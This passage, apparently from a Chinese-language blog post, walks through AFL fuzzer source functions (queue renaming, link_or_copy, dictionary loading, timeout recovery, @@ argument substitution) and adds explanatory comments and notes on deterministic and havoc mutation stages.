class="line">      </span><br><span class="line">      <span class="keyword">if</span> (src_str &amp;&amp; <span class="built_in">sscanf</span>(src_str + <span class="number">1</span>, <span class="string">&quot;%06u&quot;</span>, &amp;src_id) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">s</span> =</span> <span class="built_in">queue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 查找父测试用例</span></span><br><span class="line">        <span class="keyword">while</span> (src_id-- &amp;&amp; s)</span><br><span class="line">          s = s-&gt;next;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果找到父测试用例，设置当前深度为父深度+1</span></span><br><span class="line">        <span class="keyword">if</span> (s)</span><br><span class="line">          q-&gt;depth = s-&gt;depth + <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 更新最大深度记录</span></span><br><span class="line">        <span class="keyword">if</span> (max_depth &lt; q-&gt;depth)</span><br><span class="line">          max_depth = q-&gt;depth;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* 文件名不符合规范，创建新的标准化文件名 */</span></span><br><span class="line">      </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line">      <span class="comment">// 正常模式：保留原始文件名作为标签</span></span><br><span class="line">      u8 *use_name = <span class="built_in">strstr</span>((<span class="keyword">char</span> *)rsl, <span class="string">&quot;,orig:&quot;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (use_name)</span><br><span class="line">        use_name += <span class="number">6</span>;  <span class="comment">// 跳过 &quot;,orig:&quot; 前缀</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        use_name = rsl;  <span class="comment">// 使用原始文件名</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 格式: id:XXXXXX,orig:原始名称</span></span><br><span class="line">      nfn = alloc_printf(<span class="string">&quot;%s/queue/id:%06u,orig:%s&quot;</span>, out_dir, id, use_name);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="comment">// 简单模式：只使用ID编号</span></span><br><span class="line">      nfn = alloc_printf(<span class="string">&quot;%s/queue/id_%06u&quot;</span>, out_dir, id);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 创建硬链接或复制文件到新位置 */</span></span><br><span class="line">    link_or_copy(q-&gt;fname, nfn);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 释放旧文件名内存，更新为新文件名</span></span><br><span class="line">    ck_free(q-&gt;fname);</span><br><span class="line">    q-&gt;fname = nfn;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 保持deterministic fuzzing状态标记 */</span></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;passed_det)</span><br><span class="line">      mark_as_det_done(q);  <span class="comment">// 如果已完成确定性变异，重新标记</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 移动到下一个队列条目</span></span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">    id++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果是原地恢复模式，清理恢复目录</span></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume)</span><br><span class="line">    nuke_resume_dir();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="link-or-copy"><a href="#link-or-copy" class="headerlink" title="link_or_copy"></a>link_or_copy</h3><p>这个函数就是为了在新的path中创造一个硬链接从new_path到old_path,如果无法创建就复制一份到新路径，这里主要是为了在输出路径中的queue路径中添加一个副本。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">link_or_copy</span><span class="params">(u8 *old_path, u8 *new_path)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 首先尝试创建硬链接（最高效的方式） */</span></span><br><span class="line">  s32 i = link(old_path, new_path);</span><br><span class="line">  s32 sfd, dfd;  <span class="comment">// 源文件和目标文件的文件描述符</span></span><br><span class="line">  u8 *tmp;       <span class="comment">// 用于复制的缓冲区</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果硬链接创建成功（返回0），直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (!i)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 硬链接失败，退回到复制文件的方式</span></span><br><span class="line"><span class="comment">   * 硬链接可能因为以下原因失败：</span></span><br><span class="line"><span class="comment">   * - 源和目标在不同的文件系统上</span></span><br><span class="line"><span class="comment">   * - 文件系统不支持硬链接</span></span><br><span class="line"><span class="comment">   * - 权限问题等 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打开源文件用于读取 */</span></span><br><span class="line">  sfd = open(old_path, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (sfd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, old_path);  <span class="comment">// 打开失败，致命错误退出</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建目标文件用于写入</span></span><br><span class="line"><span class="comment">   * O_WRONLY: 只写模式</span></span><br><span class="line"><span class="comment">   * O_CREAT: 如果不存在则创建</span></span><br><span class="line"><span class="comment">   * O_EXCL: 确保创建新文件（如果已存在则失败）</span></span><br><span class="line"><span class="comment">   * 0600: 权限设置（所有者可读写，其他无权限） */</span></span><br><span class="line">  dfd = open(new_path, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">  <span class="keyword">if</span> (dfd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, new_path);  <span class="comment">// 创建失败，致命错误退出</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 分配64KB的缓冲区用于文件复制 */</span></span><br><span class="line">  tmp = ck_alloc(<span class="number">64</span> * <span class="number">1024</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 循环读取源文件并写入目标文件</span></span><br><span class="line"><span class="comment">   * 每次读取最多64KB数据 */</span></span><br><span class="line">  <span class="keyword">while</span> ((i = read(sfd, tmp, <span class="number">64</span> * <span class="number">1024</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">    ck_write(dfd, tmp, i, new_path);  <span class="comment">// ck_write是AFL的安全写入函数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检查读取是否出错（i &lt; 0表示read()系统调用失败） */</span></span><br><span class="line">  <span class="keyword">if</span> (i &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;read() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 清理资源 */</span></span><br><span class="line">  ck_free(tmp);   <span class="comment">// 释放缓冲区</span></span><br><span class="line">  close(sfd);     <span class="comment">// 关闭源文件</span></span><br><span class="line">  close(dfd);     <span class="comment">// 关闭目标文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mark-as-det-done"><a href="#mark-as-det-done" class="headerlink" title="mark_as_det_done"></a>mark_as_det_done</h3><p>这里先提一下确定性变异的概念</p><h4 id="确定性变异（Deterministic-Fuzzing）说明"><a href="#确定性变异（Deterministic-Fuzzing）说明" class="headerlink" title="确定性变异（Deterministic Fuzzing）说明"></a>确定性变异（Deterministic Fuzzing）说明</h4><p>在AFL中，对每个测试用例的变异分为两个阶段：</p><ol><li><p>确定性阶段</p><p>（Deterministic）：</p><ul><li>系统地尝试所有预定义的变异操作</li><li>包括位翻转、算术运算、插入特殊值等</li><li>每个操作都会执行，不随机</li><li>耗时较长但覆盖全面</li></ul></li><li><p>随机性阶段</p><p>（Havoc）：</p><ul><li>随机组合各种变异操作</li><li>更快但可能遗漏某些路径</li></ul></li></ol><p>这里调用这个函数在这里只有在恢复模式才会调用，如果已完成确定性编译就会调用这个函数，并会创建一个新文件这个文件会在read_testcases中检查，如果存在就会标记q-&gt;passed_det = 1，然后这里会新建一个标记文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mark_as_det_done</span><span class="params">(struct queue_entry *q)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 从完整路径中提取文件名部分</span></span><br><span class="line"><span class="comment">   * 例如：/path/to/queue/id:000001 -&gt; 指向最后一个&#x27;/&#x27; */</span></span><br><span class="line">  u8 *fn = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)q-&gt;fname, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  s32 fd;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 构造状态标记文件的完整路径</span></span><br><span class="line"><span class="comment">   * fn + 1 跳过&#x27;/&#x27;字符，获取纯文件名</span></span><br><span class="line"><span class="comment">   * 例如：out_dir/queue/.state/deterministic_done/id:000001 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue/.state/deterministic_done/%s&quot;</span>, out_dir, fn + <span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建一个空的标记文件</span></span><br><span class="line"><span class="comment">   * O_WRONLY: 只写模式</span></span><br><span class="line"><span class="comment">   * O_CREAT: 如果不存在则创建</span></span><br><span class="line"><span class="comment">   * O_EXCL: 确保创建新文件（防止重复标记）</span></span><br><span class="line"><span class="comment">   * 0600: 文件权限（仅所有者可读写） */</span></span><br><span class="line">  fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);  <span class="comment">// 创建失败，程序退出</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 立即关闭文件（只需要创建文件，不需要写入内容） */</span></span><br><span class="line">  close(fd);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 释放动态分配的路径字符串内存 */</span></span><br><span class="line">  ck_free(fn);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 在内存中标记该队列条目已完成确定性变异 */</span></span><br><span class="line">  q-&gt;passed_det = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h2><p>这个函数是AFL<strong>智能变异系统</strong>的基础组件，它将用户提供的领域知识（如HTML标签、SQL关键字、协议字段等）转换为内存中的token集合，供后续的确定性变异和随机变异阶段使用，从而大幅提升模糊测试发现漏洞的效率。<strong>解析路径中的级别标记，判断是文件还是目录，将每个字典token读取到内存数组中，最后按长度排序并输出统计信息。</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">load_extras</span><span class="params">(u8 *dir)</span> </span>&#123;</span><br><span class="line">  DIR *d;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">de</span>;</span></span><br><span class="line">  u32 min_len = MAX_DICT_FILE, max_len = <span class="number">0</span>, dict_level = <span class="number">0</span>;</span><br><span class="line">  u8 *x;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 处理带级别的字典路径</span></span><br><span class="line"><span class="comment">   * 例如: /path/to/dict@2 表示级别2的字典</span></span><br><span class="line"><span class="comment">   * 级别用于控制字典项在变异中的使用概率 */</span></span><br><span class="line">  <span class="keyword">if</span> ((x = <span class="built_in">strchr</span>((<span class="keyword">char</span> *)dir, <span class="string">&#x27;@&#x27;</span>))) &#123;</span><br><span class="line">    *x = <span class="number">0</span>;                    <span class="comment">// 截断@字符，分离路径和级别</span></span><br><span class="line">    dict_level = atoi(x + <span class="number">1</span>);  <span class="comment">// 解析@后面的数字作为级别</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ACTF(<span class="string">&quot;Loading extra dictionary from &#x27;%s&#x27; (level %u)...&quot;</span>, dir, dict_level);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 尝试作为目录打开 */</span></span><br><span class="line">  d = opendir(dir);</span><br><span class="line">  <span class="keyword">if</span> (!d) &#123;</span><br><span class="line">    <span class="comment">/* 如果不是目录，可能是单个文件 */</span></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOTDIR) &#123;</span><br><span class="line">      load_extras_file(dir, &amp;min_len, &amp;max_len, dict_level);  <span class="comment">// 加载单个字典文件</span></span><br><span class="line">      <span class="keyword">goto</span> check_and_sort;  <span class="comment">// 跳到检查和排序步骤</span></span><br><span class="line">    &#125;</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, dir);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 目录模式不支持级别标记 */</span></span><br><span class="line">  <span class="keyword">if</span> (x)</span><br><span class="line">    FATAL(<span class="string">&quot;Dictionary levels not supported for directories.&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 遍历目录中的所有文件 */</span></span><br><span class="line">  <span class="keyword">while</span> ((de = readdir(d))) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    u8 *fn = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, dir, de-&gt;d_name);  <span class="comment">// 构造完整路径</span></span><br><span class="line">    s32 fd;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查文件状态和读权限 */</span></span><br><span class="line">    <span class="keyword">if</span> (lstat(fn, &amp;st) || access(fn, R_OK))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 跳过非常规文件（包括 . 和 .. 目录） */</span></span><br><span class="line">    <span class="keyword">if</span> (!S_ISREG(st.st_mode) || !st.st_size) &#123;</span><br><span class="line">      ck_free(fn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查文件大小限制（默认MAX_DICT_FILE = 128字节） */</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_DICT_FILE)</span><br><span class="line">      FATAL(<span class="string">&quot;Extra &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn, DMS(st.st_size),</span><br><span class="line">            DMS(MAX_DICT_FILE));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 更新最小和最大长度统计 */</span></span><br><span class="line">    <span class="keyword">if</span> (min_len &gt; st.st_size)</span><br><span class="line">      min_len = st.st_size;</span><br><span class="line">    <span class="keyword">if</span> (max_len &lt; st.st_size)</span><br><span class="line">      max_len = st.st_size;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 扩展extras数组，为新字典项分配空间 */</span></span><br><span class="line">    extras = ck_realloc_block(extras, (extras_cnt + <span class="number">1</span>) * <span class="keyword">sizeof</span>(struct extra_data));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 为字典内容分配内存 */</span></span><br><span class="line">    extras[extras_cnt].data = ck_alloc(st.st_size);</span><br><span class="line">    extras[extras_cnt].len = st.st_size;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 读取文件内容到内存 */</span></span><br><span class="line">    fd = open(fn, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">    ck_read(fd, extras[extras_cnt].data, st.st_size, fn);</span><br><span class="line">    close(fd);</span><br><span class="line">    </span><br><span class="line">    ck_free(fn);</span><br><span class="line">    extras_cnt++;  <span class="comment">// 增加字典项计数</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  closedir(d);</span><br><span class="line"></span><br><span class="line">check_and_sort:</span><br><span class="line">  <span class="comment">/* 确保至少加载了一个字典项 */</span></span><br><span class="line">  <span class="keyword">if</span> (!extras_cnt)</span><br><span class="line">    FATAL(<span class="string">&quot;No usable files in &#x27;%s&#x27;&quot;</span>, dir);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 按长度排序字典项（从短到长）</span></span><br><span class="line"><span class="comment">   * 这样在变异时可以优先使用较短的token */</span></span><br><span class="line">  qsort(extras, extras_cnt, <span class="keyword">sizeof</span>(struct extra_data), compare_extras_len);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 输出加载统计信息 */</span></span><br><span class="line">  OKF(<span class="string">&quot;Loaded %u extra tokens, size range %s to %s.&quot;</span>, extras_cnt, DMS(min_len),</span><br><span class="line">      DMS(max_len));</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 警告：过长的token可能效果不佳 */</span></span><br><span class="line">  <span class="keyword">if</span> (max_len &gt; <span class="number">32</span>)</span><br><span class="line">    WARNF(<span class="string">&quot;Some tokens are relatively large (%s) - consider trimming.&quot;</span>,</span><br><span class="line">          DMS(max_len));</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 警告：过多的token会采用概率性使用</span></span><br><span class="line"><span class="comment">   * MAX_DET_EXTRAS通常是200，在确定性阶段只使用前200个 */</span></span><br><span class="line">  <span class="keyword">if</span> (extras_cnt &gt; MAX_DET_EXTRAS)</span><br><span class="line">    WARNF(<span class="string">&quot;More than %u tokens - will use them probabilistically.&quot;</span>,</span><br><span class="line">          MAX_DET_EXTRAS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">find_timeout</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> u8 tmp[<span class="number">4096</span>]; <span class="comment">/* 静态缓冲区，用于读取文件内容 */</span></span><br><span class="line">  u8 *fn, *off;</span><br><span class="line">  s32 fd, i;</span><br><span class="line">  u32 ret;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 只在恢复模式下执行，新运行不需要 */</span></span><br><span class="line">  <span class="keyword">if</span> (!resuming_fuzz)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 根据恢复模式类型确定fuzzer_stats文件位置 */</span></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume)</span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);  <span class="comment">// 原地恢复：在输出目录</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/../fuzzer_stats&quot;</span>, in_dir); <span class="comment">// 普通恢复：在输入目录的父目录</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打开统计文件 */</span></span><br><span class="line">  fd = open(fn, O_RDONLY);</span><br><span class="line">  ck_free(fn);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 文件不存在则直接返回（可能是首次运行） */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 读取文件内容到缓冲区 */</span></span><br><span class="line">  i = read(fd, tmp, <span class="keyword">sizeof</span>(tmp) - <span class="number">1</span>);</span><br><span class="line">  (<span class="keyword">void</span>)i; <span class="comment">/* 显式忽略返回值，避免编译器警告 */</span></span><br><span class="line">  close(fd);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 在文件内容中查找超时设置行</span></span><br><span class="line"><span class="comment">   * fuzzer_stats文件格式类似：</span></span><br><span class="line"><span class="comment">   * exec_timeout      : 1000</span></span><br><span class="line"><span class="comment">   * 这里查找的是冒号前的标签 */</span></span><br><span class="line">  off = <span class="built_in">strstr</span>((<span class="keyword">char</span> *)tmp, <span class="string">&quot;exec_timeout      : &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!off)</span><br><span class="line">    <span class="keyword">return</span>;  <span class="comment">// 没找到超时设置</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 解析超时值（跳过20个字符到达数字部分）</span></span><br><span class="line"><span class="comment">   * &quot;exec_timeout      : &quot; 正好20个字符 */</span></span><br><span class="line">  ret = atoi(off + <span class="number">20</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 忽略太小的超时值（&lt;=4ms认为无效） */</span></span><br><span class="line">  <span class="keyword">if</span> (ret &lt;= <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 恢复之前的超时设置 */</span></span><br><span class="line">  exec_tmout = ret;</span><br><span class="line">  timeout_given = <span class="number">3</span>;  <span class="comment">// 标记为从fuzzer_stats恢复的超时值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数功能总结"><a href="#函数功能总结" class="headerlink" title="函数功能总结"></a>函数功能总结</h3><p><strong>从之前运行的 <code>fuzzer_stats</code> 文件中恢复执行超时设置，确保恢复模式下保持一致的测试配置。</strong></p><h3 id="设计细节"><a href="#设计细节" class="headerlink" title="设计细节"></a>设计细节</h3><h4 id="1-fuzzer-stats-文件格式"><a href="#1-fuzzer-stats-文件格式" class="headerlink" title="1. fuzzer_stats 文件格式"></a>1. <strong>fuzzer_stats 文件格式</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start_time        : 1634567890</span><br><span class="line">last_update       : 1634568123</span><br><span class="line">exec_timeout      : 1000</span><br><span class="line">cycles_done       : 5</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="2-两种恢复路径"><a href="#2-两种恢复路径" class="headerlink" title="2. 两种恢复路径"></a>2. <strong>两种恢复路径</strong></h4><ul><li><strong>原地恢复</strong> (<code>-i-</code>)：在原输出目录继续</li><li><strong>普通恢复</strong>：从新的输入目录恢复，stats文件在其父目录</li></ul><h4 id="3-超时值验证"><a href="#3-超时值验证" class="headerlink" title="3. 超时值验证"></a>3. <strong>超时值验证</strong></h4><ul><li>小于等于4ms的值被忽略（可能是损坏的数据）</li><li><code>timeout_given = 3</code> 表示这是恢复的值，不同于命令行指定（<code>= 2</code>）或默认值（<code>= 1</code>）</li></ul><h4 id="4-容错设计"><a href="#4-容错设计" class="headerlink" title="4. 容错设计"></a>4. <strong>容错设计</strong></h4><ul><li>文件不存在时静默返回</li><li>读取错误被忽略</li><li>找不到超时配置时静默返回</li><li>无效的超时值被过滤</li></ul><p>这个函数确保了AFL在恢复运行时能保持与之前相同的超时配置，避免因超时设置不一致导致的测试结果差异。</p><h2 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h2><p>这里是将argv数组中@@的一项替换为输出目录的.cur_input，也就是out_file,用于存放当前测试输入的临时文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">detect_file_args</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  u32 i = <span class="number">0</span>;</span><br><span class="line">  u8 *cwd = getcwd(<span class="literal">NULL</span>, <span class="number">0</span>);  <span class="comment">// 获取当前工作目录</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!cwd)</span><br><span class="line">    PFATAL(<span class="string">&quot;getcwd() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 遍历所有命令行参数，查找@@占位符 */</span></span><br><span class="line">  <span class="keyword">while</span> (argv[i]) &#123;</span><br><span class="line">    <span class="comment">/* 查找参数中的@@标记</span></span><br><span class="line"><span class="comment">     * @@是AFL的特殊标记，表示输入文件位置 */</span></span><br><span class="line">    u8 *aa_loc = <span class="built_in">strstr</span>((<span class="keyword">char</span> *)argv[i], <span class="string">&quot;@@&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (aa_loc) &#123;</span><br><span class="line">      u8 *aa_subst, *n_arg;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 如果还没有指定输出文件，创建默认文件名</span></span><br><span class="line"><span class="comment">       * .cur_input 是AFL用于存放当前测试输入的临时文件 */</span></span><br><span class="line">      <span class="keyword">if</span> (!out_file)</span><br><span class="line">        out_file = alloc_printf(<span class="string">&quot;%s/.cur_input&quot;</span>, out_dir);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 确保使用绝对路径</span></span><br><span class="line"><span class="comment">       * 如果out_file已经是绝对路径，直接使用</span></span><br><span class="line"><span class="comment">       * 否则，将其转换为绝对路径 */</span></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        aa_subst = out_file;  <span class="comment">// 已经是绝对路径</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        aa_subst = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, cwd, out_file);  <span class="comment">// 构造绝对路径</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 构造替换后的参数</span></span><br><span class="line"><span class="comment">       * 将@@替换为实际的文件路径 */</span></span><br><span class="line">      *aa_loc = <span class="number">0</span>;  <span class="comment">// 临时截断字符串（@@位置变为\0）</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 拼接: 原参数@@前的部分 + 文件路径 + @@后的部分</span></span><br><span class="line">      n_arg = alloc_printf(<span class="string">&quot;%s%s%s&quot;</span>, argv[i], aa_subst, aa_loc + <span class="number">2</span>);</span><br><span class="line">      </span><br><span class="line">      argv[i] = n_arg;  <span class="comment">// 替换原参数</span></span><br><span class="line">      *aa_loc = <span class="string">&#x27;@&#x27;</span>;     <span class="comment">// 恢复原字符串（虽然不再使用）</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 释放临时分配的绝对路径（如果有） */</span></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        ck_free(aa_subst);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(cwd); <span class="comment">/* 释放getcwd分配的内存（不通过AFL的内存跟踪） */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h2><p>这个函数就是如果没有out_file的话就从stdin输入</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_stdio_file</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 构造标准输入文件的路径</span></span><br><span class="line"><span class="comment">   * .cur_input 是AFL用于存放当前测试输入的文件 */</span></span><br><span class="line">  u8 *fn = alloc_printf(<span class="string">&quot;%s/.cur_input&quot;</span>, out_dir);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 删除可能存在的旧文件</span></span><br><span class="line"><span class="comment">   * 忽略错误（文件可能不存在） */</span></span><br><span class="line">  unlink(fn); <span class="comment">/* Ignore errors */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 创建新的输入文件</span></span><br><span class="line"><span class="comment">   * O_RDWR: 读写模式</span></span><br><span class="line"><span class="comment">   * O_CREAT: 如果不存在则创建</span></span><br><span class="line"><span class="comment">   * O_EXCL: 确保创建新文件（与O_CREAT结合，如果文件已存在则失败）</span></span><br><span class="line"><span class="comment">   * 0600: 权限（仅所有者可读写） */</span></span><br><span class="line">  out_fd = open(fn, O_RDWR | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (out_fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">  </span><br><span class="line">  ck_free(fn);  <span class="comment">// 释放文件名字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h2><p>这个函数主要是对待测文件做检查，全面验证和分析目标二进制文件，确保它适合进行模糊测试。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">check_binary</span><span class="params">(u8 *fname)</span> </span>&#123;</span><br><span class="line">  u8 *env_path = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  s32 fd;</span><br><span class="line">  u8 *f_data;</span><br><span class="line">  u32 f_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Validating target binary...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 第一部分：查找和验证可执行文件 ===== */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 判断是绝对路径/相对路径 还是 需要在PATH中查找 